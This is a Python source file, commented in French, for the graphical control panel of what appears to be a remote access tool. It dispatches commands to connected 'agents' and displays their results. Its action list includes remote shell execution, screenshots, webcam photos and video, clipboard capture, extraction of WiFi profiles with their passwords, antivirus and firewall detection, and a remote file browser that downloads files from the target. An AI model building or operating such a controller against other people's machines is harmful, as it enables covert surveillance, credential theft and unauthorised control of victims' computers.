"""
Panel d'actions avec execution distante et explorateur de fichiers graphique.
"""
import base64
from io import BytesIO
from datetime import datetime
from pathlib import Path

import customtkinter as ctk
from PIL import Image

from core.agent_manager import AgentManager
from core.server import AgentInfo
from core.protocol import MsgType

CATEGORIES = [
    {"id": "system", "label": "Systeme", "color": "#1f6feb"},
    {"id": "screen", "label": "Ecran", "color": "#8957e5"},
    {"id": "files", "label": "Fichiers", "color": "#3fb950"},
    {"id": "network", "label": "Reseau", "color": "#f0883e"},
    {"id": "shell", "label": "Shell", "color": "#00d4ff"},
    {"id": "security", "label": "Securite", "color": "#f85149"},
]

ACTIONS: dict[str, list] = {
    "system": [
        {"id": "sysinfo", "icon": "💻", "label": "Infos systeme", "desc": "OS, CPU, RAM, hostname"},
        {"id": "processes", "icon": "⚙", "label": "Processus", "desc": "Liste des processus actifs"},
        {"id": "services", "icon": "🔧", "label": "Services", "desc": "Services systeme actifs"},
        {"id": "users", "icon": "👥", "label": "Utilisateurs", "desc": "Utilisateurs connectes"},
        {"id": "env_vars", "icon": "📋", "label": "Variables env.", "desc": "Variables d'environnement"},
        {"id": "uptime", "icon": "⏱", "label": "Uptime", "desc": "Temps de fonctionnement"},
        {"id": "disk_usage", "icon": "💾", "label": "Disques", "desc": "Usage des partitions"},
        {"id": "installed_sw", "icon": "📦", "label": "Logiciels installes", "desc": "Logiciels sur le systeme"},
    ],
    "screen": [
        {"id": "screenshot", "icon": "📷", "label": "Capture ecran", "desc": "Screenshot distant"},
        {"id": "webcam_photo", "icon": "📸", "label": "Photo webcam", "desc": "Prendre une photo"},
        {"id": "webcam_video", "icon": "🎥", "label": "Video webcam", "desc": "Enregistrer une video"},
        {"id": "clipboard", "icon": "📋", "label": "Presse-papiers", "desc": "Contenu du clipboard"},
        {"id": "active_window", "icon": "🪟", "label": "Fenetre active", "desc": "Application en premier plan"},
    ],
    "files": [
        {"id": "listdir", "icon": "📁", "label": "Explorer", "desc": "Naviguer fichiers/dossiers"},
        {"id": "file_search", "icon": "🔍", "label": "Rechercher", "desc": "Cherche un fichier"},
        {"id": "recent_files", "icon": "🕐", "label": "Recents", "desc": "Derniers fichiers ouverts"},
    ],
    "network": [
        {"id": "network_info", "icon": "🌐", "label": "Interfaces reseau", "desc": "Adresses IP et adaptateurs"},
        {"id": "open_ports", "icon": "🔌", "label": "Ports en ecoute", "desc": "Ports ouverts"},
        {"id": "connections", "icon": "🔗", "label": "Connexions actives", "desc": "Connexions ESTABLISHED"},
        {"id": "dns_lookup", "icon": "🔎", "label": "Resolution DNS", "desc": "Resout un domaine"},
        {"id": "ping_target", "icon": "📡", "label": "Ping cible", "desc": "Ping une adresse"},
        {"id": "arp_table", "icon": "🗺", "label": "Table ARP", "desc": "Table ARP locale"},
    ],
    "shell": [
        {"id": "shell", "icon": "⌨", "label": "Commande shell", "desc": "Execute une commande"},
        {"id": "cmd_history", "icon": "📜", "label": "Historique", "desc": "Commandes precedentes"},
        {"id": "whoami", "icon": "🪪", "label": "Identite", "desc": "whoami /all"},
        {"id": "cwd", "icon": "📍", "label": "Repertoire actuel", "desc": "Dossier courant"},
    ],
    "security": [
        {"id": "startup_items", "icon": "🚀", "label": "Demarrage", "desc": "Programmes au demarrage"},
        {"id": "scheduled_tasks", "icon": "📅", "label": "Taches planifiees", "desc": "schtasks /query"},
        {"id": "wifi_profiles", "icon": "📶", "label": "Profils WiFi", "desc": "SSID + mots de passe"},
        {"id": "firewall", "icon": "🛡", "label": "Pare-feu", "desc": "Statut du pare-feu"},
        {"id": "antivirus", "icon": "🦠", "label": "Antivirus", "desc": "Antivirus detecte"},
        {"id": "event_logs", "icon": "📝", "label": "Journaux systeme", "desc": "20 derniers evenements"},
        {"id": "ping", "icon": "🏓", "label": "Ping agent", "desc": "Test de latence"},
    ],
}

NEED_PARAM = {
    "file_search": ("Rechercher un fichier", "Nom ou motif (ex: *.txt)", "name"),
    "dns_lookup": ("Resolution DNS", "Nom de domaine", "host"),
    "ping_target": ("Ping", "Adresse IP ou domaine", "host"),
    "shell": ("Executer une commande shell", "Commande a executer", "cmd"),
}


class ActionCard(ctk.CTkFrame):
    def __init__(self, parent, action: dict, cat_color: str, on_click):
        super().__init__(
            parent,
            fg_color="#161b22",
            border_color="#30363d",
            border_width=1,
            corner_radius=10,
            cursor="hand2",
            width=158,
            height=100,
        )
        self.pack_propagate(False)
        self._action = action
        self._on_click = on_click
        self._cat_color = cat_color
        self._build()
        self.bind("<Button-1>", self._click)
        self.bind("<Enter>", self._hover_on)
        self.bind("<Leave>", self._hover_off)

    def _build(self):
        bar = ctk.CTkFrame(self, fg_color=self._cat_color, height=3, corner_radius=0)
        bar.pack(fill="x")

        self._icon_lbl = ctk.CTkLabel(
            self,
            text=self._action["icon"],
            font=ctk.CTkFont(size=28),
            text_color="#c9d1d9",
        )
        self._icon_lbl.pack(pady=(6, 0))

        ctk.CTkLabel(
            self,
            text=self._action["label"],
            font=ctk.CTkFont(size=11, weight="bold"),
            text_color="#c9d1d9",
            wraplength=140,
        ).pack()

        ctk.CTkLabel(
            self,
            text=self._action["desc"],
            font=ctk.CTkFont(size=9),
            text_color="#4a5568",
            wraplength=140,
        ).pack()

        for w in self.winfo_children():
            if not isinstance(w, ctk.CTkFrame):
                w.bind("<Button-1>", self._click)
                w.bind("<Enter>", self._hover_on)
                w.bind("<Leave>", self._hover_off)

    def _click(self, _=None):
        self._on_click(self._action)

    def _hover_on(self, _=None):
        self.configure(fg_color="#1c2128", border_color=self._cat_color)

    def _hover_off(self, _=None):
        self.configure(fg_color="#161b22", border_color="#30363d")

    def set_running(self, val: bool):
        self._icon_lbl.configure(text="⏳" if val else self._action["icon"])


class ActionsPanel(ctk.CTkFrame):
    def __init__(self, parent, manager: AgentManager):
        super().__init__(parent, fg_color="#0d1117", corner_radius=0)
        self._manager = manager
        self._cards: dict[str, ActionCard] = {}
        self._active_cat = "system"
        self._last_screenshot: Image.Image | None = None
        self._pending_by_action: dict[str, str] = {}

        self._remote_path = "."
        self._selected_file_path: str | None = None
        self._selected_file_name: str | None = None
        self._download_dir = Path(__file__).resolve().parents[2] / "downloads"
        self._path_history: list[str] = []
        self._path_history_index = -1
        self._listdir_nav_mode = "push"

        self._build()
        self._register_events()

    def _build(self):
        header = ctk.CTkFrame(self, fg_color="#161b22", corner_radius=0, height=56)
        header.pack(fill="x")
        header.pack_propagate(False)

        ctk.CTkLabel(
            header,
            text="Actions",
            font=ctk.CTkFont(size=16, weight="bold"),
            text_color="#c9d1d9",
        ).pack(side="left", padx=20, pady=16)

        self._agent_badge = ctk.CTkLabel(
            header,
            text="Aucun agent selectionne",
            font=ctk.CTkFont(size=12),
            text_color="#4a5568",
        )
        self._agent_badge.pack(side="left", padx=8)

        self._actions_count = ctk.CTkLabel(
            header,
            text=f"{sum(len(v) for v in ACTIONS.values())} actions disponibles",
            font=ctk.CTkFont(size=11),
            text_color="#4a5568",
        )
        self._actions_count.pack(side="right", padx=20)

        tabs_frame = ctk.CTkFrame(self, fg_color="#0b0f14", corner_radius=0, height=48)
        tabs_frame.pack(fill="x")
        tabs_frame.pack_propagate(False)

        self._tab_btns: dict[str, ctk.CTkButton] = {}
        for cat in CATEGORIES:
            btn = ctk.CTkButton(
                tabs_frame,
                text=cat["label"],
                font=ctk.CTkFont(size=12),
                width=100,
                height=32,
                corner_radius=16,
                fg_color="transparent",
                hover_color="#21262d",
                text_color="#7c8c96",
                border_width=1,
                border_color="#30363d",
                command=lambda c=cat: self._switch_cat(c),
            )
            btn.pack(side="left", padx=(8, 0), pady=8)
            self._tab_btns[cat["id"]] = btn

        body = ctk.CTkFrame(self, fg_color="#0d1117")
        body.pack(fill="both", expand=True)

        self._cards_scroll = ctk.CTkScrollableFrame(
            body,
            fg_color="#0d1117",
            corner_radius=0,
            scrollbar_button_color="#30363d",
            width=520,
        )
        self._cards_scroll.pack(side="left", fill="y", padx=12, pady=12)

        ctk.CTkFrame(body, fg_color="#21262d", width=1).pack(side="left", fill="y")

        self._result_pane = ctk.CTkFrame(body, fg_color="#0d1117")
        self._result_pane.pack(side="left", fill="both", expand=True, padx=12, pady=12)

        result_hdr = ctk.CTkFrame(self._result_pane, fg_color="#0d1117")
        result_hdr.pack(fill="x", pady=(0, 8))

        ctk.CTkLabel(
            result_hdr,
            text="RESULTAT",
            font=ctk.CTkFont(size=10),
            text_color="#4a5568",
            anchor="w",
        ).pack(side="left")

        self._result_action_lbl = ctk.CTkLabel(
            result_hdr,
            text="",
            font=ctk.CTkFont(size=11),
            text_color="#58a6ff",
        )
        self._result_action_lbl.pack(side="left", padx=8)

        self._result_time_lbl = ctk.CTkLabel(
            result_hdr,
            text="",
            font=ctk.CTkFont(size=10),
            text_color="#4a5568",
        )
        self._result_time_lbl.pack(side="right")

        self._result_box = ctk.CTkFrame(
            self._result_pane,
            fg_color="#161b22",
            corner_radius=8,
            border_color="#30363d",
            border_width=1,
        )
        self._result_box.pack(fill="both", expand=True)

        self._res_placeholder = ctk.CTkLabel(
            self._result_box,
            text="Selectionnez un agent\net cliquez sur une action.",
            font=ctk.CTkFont(size=13),
            text_color="#3d4a54",
            justify="center",
        )
        self._res_placeholder.pack(expand=True)

        self._result_text = ctk.CTkTextbox(
            self._result_box,
            fg_color="#161b22",
            text_color="#c9d1d9",
            font=ctk.CTkFont(family="Consolas", size=12),
            border_width=0,
            state="disabled",
        )

        self._result_img_lbl = ctk.CTkLabel(self._result_box, text="")

        self._build_file_browser_widgets()

        self._status = ctk.CTkLabel(
            self,
            text="",
            font=ctk.CTkFont(size=11),
            text_color="#7c8c96",
            anchor="w",
        )
        self._status.pack(fill="x", padx=20, pady=(0, 6))

        self._switch_cat(CATEGORIES[0])

    def _build_file_browser_widgets(self):
        self._file_box = ctk.CTkFrame(self._result_box, fg_color="#0f141a", corner_radius=6)

        top = ctk.CTkFrame(self._file_box, fg_color="#0f141a")
        top.pack(fill="x", padx=8, pady=(8, 4))

        ctk.CTkLabel(top, text="Parcourir:", text_color="#7c8c96", font=ctk.CTkFont(size=11)).pack(side="left")
        self._path_label = ctk.CTkLabel(
            top,
            text=".",
            text_color="#c9d1d9",
            font=ctk.CTkFont(family="Consolas", size=11),
            anchor="w",
        )
        self._path_label.pack(side="left", fill="x", expand=True, padx=(8, 6))

        self._up_btn = ctk.CTkButton(top, text="Haut", width=58, height=28, command=self._go_parent)
        self._up_btn.pack(side="right", padx=(4, 0))
        self._refresh_btn = ctk.CTkButton(top, text="Rafraichir", width=80, height=28, command=self._refresh_current_dir)
        self._refresh_btn.pack(side="right")
        self._forward_btn = ctk.CTkButton(top, text=">", width=36, height=28, command=self._go_forward)
        self._forward_btn.pack(side="right", padx=(4, 0))
        self._back_btn = ctk.CTkButton(top, text="<", width=36, height=28, command=self._go_back)
        self._back_btn.pack(side="right", padx=(4, 0))

        self._file_list = ctk.CTkScrollableFrame(
            self._file_box,
            fg_color="#0d1117",
            corner_radius=6,
            scrollbar_button_color="#30363d",
        )
        self._file_list.pack(fill="both", expand=True, padx=8, pady=6)

        action_row = ctk.CTkFrame(self._file_box, fg_color="#0f141a")
        action_row.pack(fill="x", padx=8, pady=(2, 8))

        self._selected_label = ctk.CTkLabel(
            action_row,
            text="Fichier: aucun",
            text_color="#7c8c96",
            font=ctk.CTkFont(size=11),
            anchor="w",
        )
        self._selected_label.pack(side="left", fill="x", expand=True)

        ctk.CTkButton(action_row, text="Lire", width=70, height=28, command=self._read_selected).pack(side="right", padx=(4, 0))
        ctk.CTkButton(action_row, text="Hash", width=70, height=28, command=self._hash_selected).pack(side="right", padx=(4, 0))
        ctk.CTkButton(action_row, text="Telecharger", width=100, height=28, command=self._download_selected).pack(side="right")

    def _switch_cat(self, cat: dict):
        self._active_cat = cat["id"]

        for cid, btn in self._tab_btns.items():
            is_active = cid == cat["id"]
            cat_color = next((c["color"] for c in CATEGORIES if c["id"] == cid), "#7c8c96")
            btn.configure(
                fg_color=cat_color if is_active else "transparent",
                text_color="white" if is_active else "#7c8c96",
                border_color=cat_color if is_active else "#30363d",
            )

        for w in self._cards_scroll.winfo_children():
            w.destroy()
        self._cards.clear()

        actions = ACTIONS.get(cat["id"], [])
        cat_color = cat["color"]
        cols = 3

        for idx, action in enumerate(actions):
            row, col = divmod(idx, cols)
            card = ActionCard(self._cards_scroll, action, cat_color, on_click=self._on_card_click)
            card.grid(row=row, column=col, padx=6, pady=6)
            self._cards[action["id"]] = card

        if cat["id"] == "files":
            self._show_file_browser()
            self._refresh_current_dir()

    def _on_card_click(self, action: dict):
        agent = self._manager.selected
        if not agent:
            self._set_status("Aucun agent selectionne. Allez dans l'onglet Agents.", error=True)
            return

        action_id = action["id"]

        if action_id == "listdir":
            self._refresh_current_dir()
            return

        if action_id == "webcam_video":
            self._execute("webcam_video", {"duration": 6, "fps": 10})
            return

        if action_id in NEED_PARAM:
            title, prompt, key = NEED_PARAM[action_id]
            self._ask_param(title, prompt, lambda v, aid=action_id, k=key: self._execute(aid, {k: v}))
        else:
            self._execute(action_id)

    def _execute(self, action_id: str, params: dict = None):
        card = self._cards.get(action_id)
        if card:
            card.set_running(True)

        self._set_status(f"Execution : {action_id}...")
        dispatch = self._manager.execute(action_id, params or {})
        if not dispatch.ok:
            self._set_status("Impossible d'envoyer la commande.", error=True)
            if card:
                card.set_running(False)
            return

        if dispatch.request_id:
            self._pending_by_action[action_id] = dispatch.request_id

    def _ask_param(self, title: str, prompt: str, callback):
        popup = ctk.CTkToplevel(self)
        popup.title(title)
        popup.geometry("420x190")
        popup.resizable(False, False)
        popup.configure(fg_color="#161b22")
        popup.grab_set()
        popup.lift()
        popup.focus_force()

        popup.update_idletasks()
        px = self.winfo_rootx() + (self.winfo_width() - 420) // 2
        py = self.winfo_rooty() + (self.winfo_height() - 190) // 2
        popup.geometry(f"420x190+{px}+{py}")

        ctk.CTkLabel(
            popup,
            text=title,
            font=ctk.CTkFont(size=14, weight="bold"),
            text_color="#c9d1d9",
        ).pack(pady=(16, 4))

        ctk.CTkLabel(
            popup,
            text=prompt,
            font=ctk.CTkFont(size=11),
            text_color="#7c8c96",
        ).pack()

        entry = ctk.CTkEntry(
            popup,
            fg_color="#0d1117",
            border_color="#30363d",
            text_color="#c9d1d9",
            font=ctk.CTkFont(size=13),
            width=360,
            height=36,
        )
        entry.pack(pady=10)
        entry.focus_set()

        def confirm(_=None):
            val = entry.get().strip()
            popup.destroy()
            callback(val)

        entry.bind("<Return>", confirm)

        btns = ctk.CTkFrame(popup, fg_color="#161b22")
        btns.pack()
        ctk.CTkButton(
            btns,
            text="Annuler",
            width=90,
            height=30,
            fg_color="#21262d",
            hover_color="#30363d",
            text_color="#c9d1d9",
            command=popup.destroy,
        ).pack(side="left", padx=4)
        ctk.CTkButton(
            btns,
            text="Executer",
            width=90,
            height=30,
            fg_color="#1f6feb",
            hover_color="#388bfd",
            command=confirm,
        ).pack(side="left", padx=4)

    def _show_text(self, text: str, action_label: str):
        self._res_placeholder.pack_forget()
        self._result_img_lbl.pack_forget()
        self._file_box.pack_forget()

        self._result_text.pack(fill="both", expand=True, padx=4, pady=4)
        self._result_text.configure(state="normal")
        self._result_text.delete("0.0", "end")
        self._result_text.insert("end", text)
        self._result_text.configure(state="disabled")

        self._result_action_lbl.configure(text=f"  {action_label}")
        self._result_time_lbl.configure(text=datetime.now().strftime("%H:%M:%S"))

    def _show_image(self, b64_data: str, title: str = "Image"):
        try:
            img = Image.open(BytesIO(base64.b64decode(b64_data)))
            self._last_screenshot = img
            w = max(1, self._result_box.winfo_width() - 16)
            h = max(1, self._result_box.winfo_height() - 16)
            img.thumbnail((w, h), Image.LANCZOS)
            ctk_img = ctk.CTkImage(light_image=img, dark_image=img, size=img.size)

            self._result_text.pack_forget()
            self._res_placeholder.pack_forget()
            self._file_box.pack_forget()

            self._result_img_lbl.configure(image=ctk_img, text="")
            self._result_img_lbl.image = ctk_img
            self._result_img_lbl.pack(expand=True)

            self._result_action_lbl.configure(text=f"  {title}")
            self._result_time_lbl.configure(text=datetime.now().strftime("%H:%M:%S"))
        except Exception as e:
            self._show_text(f"[Erreur decodage image: {e}]", title)

    def _show_file_browser(self):
        self._res_placeholder.pack_forget()
        self._result_img_lbl.pack_forget()
        self._result_text.pack_forget()
        self._file_box.pack(fill="both", expand=True, padx=6, pady=6)
        self._result_action_lbl.configure(text="  Explorateur distant")
        self._result_time_lbl.configure(text=datetime.now().strftime("%H:%M:%S"))

    def _set_status(self, msg: str, error: bool = False):
        self._status.configure(text=msg, text_color="#f85149" if error else "#7c8c96")

    def _register_events(self):
        self._manager.on_response(self._on_response)
        self._manager.on_selection(lambda a: self.after(0, lambda: self._on_selection(a)))

    def _on_selection(self, agent: AgentInfo | None):
        if agent:
            self._agent_badge.configure(text=f"-> {agent.hostname} ({agent.ip})", text_color="#00d4ff")
            self._remote_path = "."
            self._selected_file_path = None
            self._selected_file_name = None
            self._selected_label.configure(text="Fichier: aucun")
            self._path_history = []
            self._path_history_index = -1
            self._sync_nav_buttons()
        else:
            self._agent_badge.configure(text="Aucun agent selectionne", text_color="#4a5568")

    def _on_response(self, agent: AgentInfo, msg: dict):
        if msg.get("type") != MsgType.RESPONSE:
            return

        selected = self._manager.selected
        if not selected or agent.id != selected.id:
            return

        action_id = msg.get("action", "")
        data = msg.get("data", {})

        expected_req_id = self._pending_by_action.get(action_id)
        incoming_req_id = msg.get("id")
        if expected_req_id and incoming_req_id and expected_req_id != incoming_req_id:
            return

        action_label = action_id
        for cat_actions in ACTIONS.values():
            for action in cat_actions:
                if action["id"] == action_id:
                    action_label = f"{action['icon']} {action['label']}"
                    break

        def update():
            try:
                self._update_result(action_id, action_label, data)
            except Exception as e:
                self._set_status(f"Erreur affichage: {e}", error=True)

        self.after(0, update)

    def _update_result(self, action_id: str, action_label: str, data: dict):
        self._pending_by_action.pop(action_id, None)

        card = self._cards.get(action_id)
        if card:
            card.set_running(False)

        if "error" in data:
            self._show_text(f"[ERREUR]\n{data['error']}", action_label)
            self._set_status(f"Erreur : {data['error'][:80]}", error=True)
            return

        self._set_status(f"Resultat recu : {action_label}")

        if action_id in ("screenshot", "webcam_photo"):
            b64 = data.get("screenshot")
            if b64:
                title = "Capture ecran" if action_id == "screenshot" else "Photo webcam"
                self._show_image(b64, title)
                return

        if action_id == "webcam_video":
            self._save_remote_file(data, default_name="webcam_video.mp4", title="Video webcam")
            return

        if action_id == "dl":
            self._save_remote_file(data, default_name="download.bin", title="Telechargement")
            return

        if action_id == "listdir":
            self._remote_path = data.get("path", self._remote_path)
            self._update_path_history(self._remote_path)
            self._render_remote_entries(data.get("entries", []), self._remote_path)
            self._show_file_browser()
            return

        if "output" in data:
            text = data["output"]
            if action_id == "shell":
                meta = []
                if "exit_code" in data:
                    meta.append(f"exit={data['exit_code']}")
                if "duration_ms" in data:
                    meta.append(f"duree={data['duration_ms']}ms")
                if "shell" in data:
                    meta.append(f"shell={data['shell']}")
                if meta:
                    text = "[exec] " + " | ".join(meta) + "\n\n" + text
            self._show_text(text, action_label)
            return

        if "cwd" in data:
            self._show_text(f"Repertoire : {data['cwd']}", action_label)
            return

        if "pong" in data:
            self._show_text("Pong recu - agent reactif", action_label)
            return

        self._show_text("\n".join(f"{k:<18}: {v}" for k, v in data.items()), action_label)

    def _render_remote_entries(self, entries: list[dict], path: str):
        self._path_label.configure(text=path)
        self._selected_file_path = None
        self._selected_file_name = None
        self._selected_label.configure(text="Fichier: aucun")

        for w in self._file_list.winfo_children():
            w.destroy()

        if not entries:
            ctk.CTkLabel(self._file_list, text="(dossier vide)", text_color="#7c8c96").pack(anchor="w", pady=8)
            self._insert_navigation_entries(path)
            return

        self._insert_navigation_entries(path)

        dirs = [e for e in entries if e.get("is_dir")]
        files = [e for e in entries if not e.get("is_dir")]

        for entry in dirs + files:
            is_dir = entry.get("is_dir", False)
            name = entry.get("name", "?")
            full_path = entry.get("path", name)
            size_text = "" if is_dir else f" ({self._human_size(entry.get('size', 0))})"
            icon = "📂" if is_dir else "📄"

            btn = ctk.CTkButton(
                self._file_list,
                text=f"{icon}  {name}{size_text}",
                anchor="w",
                fg_color="#161b22",
                hover_color="#1f2933",
                text_color="#c9d1d9",
                height=30,
                command=lambda p=full_path, n=name, d=is_dir: self._on_file_entry_click(p, n, d),
            )
            btn.pack(fill="x", pady=2)

    def _insert_navigation_entries(self, path: str):
        parent = str(Path(path).parent)
        can_go_parent = bool(parent and parent != path)

        if can_go_parent:
            ctk.CTkButton(
                self._file_list,
                text="⬆  .. (dossier parent)",
                anchor="w",
                fg_color="#1b2430",
                hover_color="#243142",
                text_color="#9ec1ff",
                height=30,
                command=self._go_parent,
            ).pack(fill="x", pady=(0, 4))

        can_go_back = self._path_history_index > 0
        if can_go_back:
            ctk.CTkButton(
                self._file_list,
                text="↩  Retour dossier precedent",
                anchor="w",
                fg_color="#1b2430",
                hover_color="#243142",
                text_color="#9ec1ff",
                height=30,
                command=self._go_back,
            ).pack(fill="x", pady=(0, 6))

    def _on_file_entry_click(self, full_path: str, name: str, is_dir: bool):
        if is_dir:
            self._request_listdir(full_path, nav_mode="push")
            return

        self._selected_file_path = full_path
        self._selected_file_name = name
        self._selected_label.configure(text=f"Fichier: {name}")
        self._set_status(f"Fichier selectionne : {name}")

    def _refresh_current_dir(self):
        self._request_listdir(self._remote_path or ".", nav_mode="refresh")

    def _go_parent(self):
        current = self._remote_path or "."
        parent = str(Path(current).parent)
        if not parent or parent == current:
            self._request_listdir(current, nav_mode="refresh")
            return
        self._request_listdir(parent, nav_mode="push")

    def _go_back(self):
        if self._path_history_index <= 0:
            return
        target = self._path_history[self._path_history_index - 1]
        self._request_listdir(target, nav_mode="back")

    def _go_forward(self):
        if self._path_history_index < 0 or self._path_history_index >= len(self._path_history) - 1:
            return
        target = self._path_history[self._path_history_index + 1]
        self._request_listdir(target, nav_mode="forward")

    def _request_listdir(self, path: str, nav_mode: str = "push"):
        self._listdir_nav_mode = nav_mode
        self._execute("listdir", {"path": path})

    def _update_path_history(self, path: str):
        if not path:
            return

        mode = self._listdir_nav_mode

        if mode == "back":
            if self._path_history_index > 0:
                self._path_history_index -= 1
        elif mode == "forward":
            if self._path_history_index < len(self._path_history) - 1:
                self._path_history_index += 1
        elif mode == "refresh":
            if not self._path_history:
                self._path_history = [path]
                self._path_history_index = 0
        else:
            if self._path_history_index < len(self._path_history) - 1:
                self._path_history = self._path_history[: self._path_history_index + 1]
            if not self._path_history or self._path_history[-1] != path:
                self._path_history.append(path)
                self._path_history_index = len(self._path_history) - 1

        if self._path_history and 0 <= self._path_history_index < len(self._path_history):
            self._path_history[self._path_history_index] = path

        self._sync_nav_buttons()

    def _sync_nav_buttons(self):
        can_back = self._path_history_index > 0
        can_forward = 0 <= self._path_history_index < len(self._path_history) - 1
        self._back_btn.configure(state="normal" if can_back else "disabled")
        self._forward_btn.configure(state="normal" if can_forward else "disabled")

    def _download_selected(self):
        if not self._selected_file_path:
            self._set_status("Selectionnez un fichier d'abord.", error=True)
            return
        self._execute("dl", {"file": self._selected_file_path})

    def _read_selected(self):
        if not self._selected_file_path:
            self._set_status("Selectionnez un fichier d'abord.", error=True)
            return
        self._execute("read_file", {"file": self._selected_file_path})

    def _hash_selected(self):
        if not self._selected_file_path:
            self._set_status("Selectionnez un fichier d'abord.", error=True)
            return
        self._execute("file_hash", {"file": self._selected_file_path})

    def _save_remote_file(self, data: dict, default_name: str, title: str):
        b64 = data.get("data")
        if not b64:
            self._show_text("Reponse sans donnees de fichier.", title)
            return

        filename = data.get("filename") or default_name
        self._download_dir.mkdir(parents=True, exist_ok=True)

        target = self._download_dir / filename
        stem = target.stem
        suffix = target.suffix
        i = 1
        while target.exists():
            target = self._download_dir / f"{stem}_{i}{suffix}"
            i += 1

        raw = base64.b64decode(b64)
        target.write_bytes(raw)

        info = [
            f"Fichier enregistre: {target}",
            f"Taille: {self._human_size(len(raw))}",
        ]
        if "path" in data:
            info.append(f"Source distante: {data.get('path')}")
        if "duration_sec" in data:
            info.append(f"Duree: {data.get('duration_sec')}s")
        self._show_text("\n".join(info), title)

    @staticmethod
    def _human_size(size: int) -> str:
        value = float(size or 0)
        units = ["B", "KB", "MB", "GB"]
        for unit in units:
            if value < 1024 or unit == units[-1]:
                return f"{value:.1f} {unit}"
            value /= 1024
        return f"{size} B"
